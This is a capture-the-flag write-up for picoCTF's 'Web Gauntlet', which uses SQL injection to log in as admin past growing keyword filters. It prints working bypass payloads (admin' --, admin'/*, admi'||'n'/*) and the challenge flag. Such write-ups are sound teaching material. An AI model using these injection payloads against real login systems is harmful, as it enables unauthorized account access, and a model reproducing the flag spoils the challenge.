# 1. Web Gauntlet 

Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:58384/ http://shape-facility.picoctf.net:58384/filter.php

## Solution:

Open the given link ```http://shape-facility.picoctf.net:52907/``` 
We have to login as admin but we don’t have a password 

### Test login:
**Username-** admin
**Password-** hola

The SQL statement printed is 
```SELECT * FROM users WHERE username='admin ' AND password=‘hola'``` 

Using the website given ```http://shape-facility.picoctf.net:52827/filter.php``` it shows ```Round1: or```

### Round 1/5:

**Username-** admin' --
**Password-** ummmm 

```-- ``` comments out the password check so the query is now 
```SELECT * FROM users WHERE username='admin' --' AND password=‘ummmm'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows  ```Round2: or and like = --```

After this ```-- ``` stopped working so Im assuming the things that are on ```http://shape-facility.picoctf.net:52827/filter.php``` are what can no longer be used. 

### Round 2/5:

**Username-** admin’/*
**Password-** idk

```/* ``` is a multi-line comment which comments out the password check so the query is now 
```SELECT * FROM users WHERE username='admin'/*' AND password=‘idk'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round3: or and = like > < --```

### Round 3/5:

Because the last round didn’t mention that the same expression couldn’t be used so I used the same username 

**Username-** admin’/*
**Password-** k

The query is now,
```SELECT * FROM users WHERE username='admin'/*' AND password='k'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round4: or and = like > < -- admin```

### Round 4/5:

**Username-** admi'||'n'/*
**Password-** yes

Use ```||``` to concatenate ```admi``` and ```n``` so the query is now,
```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘yes'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round5: or and = like > < -- union admin```


### Round 5/5:

Because the last round didn’t mention that the same expression couldn’t be used so I used the same username

**Username-** admi'||'n'/*
**Password-** done

The query is now, 
```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘done'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, we finally get the flag. 

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- ```--``` is used in SQl for single line comments
- ```/*``` is used for multi-line comments
- ```||``` is used to concatenate two strings 

## Resources:
- [https://www.w3schools.com/sql/sql_comments.asp](url)
- [https://www.geeksforgeeks.org/sql/sql-concatenation-operator/](url)



